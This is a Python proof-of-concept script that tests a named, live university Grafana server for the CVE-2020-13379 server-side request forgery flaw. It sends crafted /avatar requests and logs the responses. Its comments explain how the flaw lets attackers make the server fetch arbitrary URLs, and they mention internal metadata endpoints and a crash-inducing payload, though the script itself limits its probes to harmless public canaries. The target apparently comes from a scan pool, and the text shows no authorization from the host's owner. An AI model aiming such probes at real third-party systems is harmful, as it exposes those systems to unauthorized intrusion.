# -*- coding: utf-8 -*-
"""
CVE-2020-13379 最小只读验证（gdcpic.stu.edu.cn:3000, Grafana 6.4.4）
机制：pkg/api/api.go 里 /avatar/:hash 是唯一不带 reqSignedIn 的路由；
      handler 调用 GoFetch(gravatarSource + hash + "?" + reqParams)，
      hash 由攻击者控制 -> 可注入查询参数/重定向链，使服务端发起任意出站请求。

本脚本红线（严格遵守）：
  - 只发 GET，只打 /avatar/*；
  - canary 只用公开无害地址（example.com / Gravatar 自带默认图），绝不指向目标内网、
    127.0.0.1、169.254.169.254、元数据端点、任意内部端口；
  - 绝不发送 {{printf ...}} 之类的畸形模板 payload（会 SegFault 打挂生产 Grafana）；
  - 不读取目标任何真实数据，不做端口探测；
  - 单次请求，间隔 1.5s，超时 8s，失败不重试。
"""
import time, json, requests, urllib3
urllib3.disable_warnings()

OUT = r"E:\kimi\scan\fofa_pool\edusrc_ssrf_probe_20261110.json"
BASE = "http://gdcpic.stu.edu.cn:3000"
s = requests.Session(); s.trust_env = False
s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124 Safari/537.36",
                  "Accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8"})

# 只做「端点存在性 + 服务端是否真的发起外部取回 + 参数是否影响外部目标」的对照
PROBES = [
    ("baseline_md5",      "/avatar/00000000000000000000000000000000"),
    ("baseline_empty_md5","/avatar/d41d8cd98f00b204e9800998ecf8427e"),
    ("plain_string",      "/avatar/edusrc-readonly-probe"),
    ("param_public_url",  "/avatar/edusrc-readonly-probe?d=https%3A%2F%2Fexample.com%2F"),
    ("param_gravatar_def","/avatar/edusrc-readonly-probe?d=retro"),
]

def probe(name, path):
    t0 = time.time()
    try:
        r = s.get(BASE + path, timeout=8, verify=False, allow_redirects=False)
        body = r.content
        return {"name": name, "path": path, "status": r.status_code,
                "ctype": r.headers.get("Content-Type", "")[:80],
                "location": r.headers.get("Location", "")[:160],
                "len": len(body), "elapsed": round(time.time() - t0, 2),
                "head_hex": body[:24].hex(),
                "head_text": body[:160].decode("utf-8", "ignore").replace("\n", " "),
                "magic": ("png" if body[:4] == b"\x89PNG" else
                          "jpeg" if body[:3] == b"\xff\xd8\xff" else
                          "gif" if body[:3] == b"GIF" else "other")}
    except Exception as e:
        return {"name": name, "path": path, "status": None,
                "err": type(e).__name__ + ":" + str(e)[:100],
                "elapsed": round(time.time() - t0, 2)}

res = {"ts": time.strftime("%Y-%m-%d %H:%M:%S"), "target": BASE,
       "version": "6.4.4", "cve": "CVE-2020-13379",
       "boundary": "只读 GET /avatar/*；canary 仅公开无害地址；不碰内网/元数据/DoS payload",
       "probes": []}
for name, path in PROBES:
    r = probe(name, path)
    res["probes"].append(r)
    print(name, "->", r.get("status"), r.get("ctype"), "len", r.get("len"),
          "magic", r.get("magic"), "t", r.get("elapsed"),
          "loc", (r.get("location") or "")[:70], flush=True)
    json.dump(res, open(OUT, "w", encoding="utf-8"), ensure_ascii=False, indent=1)
    time.sleep(1.5)
print("saved", OUT, flush=True)
